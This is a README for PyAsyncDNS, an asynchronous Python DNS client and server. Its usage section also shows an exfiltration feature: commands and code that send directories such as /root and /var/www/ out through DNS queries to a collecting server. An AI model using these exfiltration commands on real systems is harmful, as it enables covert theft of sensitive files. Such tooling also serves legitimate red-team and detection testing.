![PyAsyncDNS Logo](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS_small.png "PyAsyncDNS logo")

# PyAsyncDNS

## Description

This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.

## Requirements

This package require:

 - python3
 - python3 Standard Library

## Installation

### Pip

```bash
python3 -m pip install PyAsyncDNS
```

### Git

```bash
git clone "https://github.com/mauricelambert/PyAsyncDNS.git"
cd "PyAsyncDNS"
python3 -m pip install .
```

### Wget

```bash
wget https://github.com/mauricelambert/PyAsyncDNS/archive/refs/heads/main.zip
unzip main.zip
cd PyAsyncDNS-main
python3 -m pip install .
```

### cURL

```bash
curl -O https://github.com/mauricelambert/PyAsyncDNS/archive/refs/heads/main.zip
unzip main.zip
cd PyAsyncDNS-main
python3 -m pip install .
```

## Usages

### Command line

```bash
PyAsyncDNS              # Using CLI package executable
python3 -m PyAsyncDNS   # Using python module
python3 PyAsyncDNS.pyz  # Using python executable
PyAsyncDNS.exe          # Using python Windows executable

PyAsyncDNS resolve example.com
PyAsyncDNS resolve example.com A
PyAsyncDNS resolve example.com AAAA --server 127.0.0.1
PyAsyncDNS resolve example.com MX --server 127.0.0.1 --port 5353
PyAsyncDNS resolve example.com NS --server 127.0.0.1 --port 5353 --udp
PyAsyncDNS resolve example.com TXT --server 127.0.0.1 --port 5353 --tcp

PyAsyncDNS server 127.0.0.1 5353
PyAsyncDNS server 127.0.0.1 5353 --zone zone_example.json

PyAsyncDNS exfiltrator-server 127.0.0.1 53

PyAsyncDNS exfiltration-client 127.0.0.1 53 /root /var/www/
```

### Python script

```python
from PyAsyncDNS import *
from asyncio import run

server = DNSServer(zone={"example.com":{"A":["93.184.216.34"]}}, host='127.0.0.1', port=53) # configure the server
run(server.serve_forever())                                                                 # run the DNS service forever
run(query("example.com", "A", '127.0.0.1', 53))                                             # query IPv4 address for example.com name 

run(start_exfiltrator_server('127.0.0.1', 53))                # start server to save exfiltrated files
run(process_directories('/root', "127.0.0.1", 53))            # exfiltrate /root directories through DNS to 127.0.0.1:53 using UDP
```

## Links

 - [Pypi](https://pypi.org/project/PyAsyncDNS)
 - [Github](https://github.com/mauricelambert/PyAsyncDNS)
 - [Documentation datatypes](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/datatypes.html)
 - [Documentation codec](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/codec.html)
 - [Documentation client](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/client.html)
 - [Documentation server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/server.html)
 - [Documentation exfiltrator client](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator_client.html)
 - [Documentation exfiltrator server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator_server.html)
 - [Python executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.pyz)
 - [Python Windows executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.exe)

## License

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
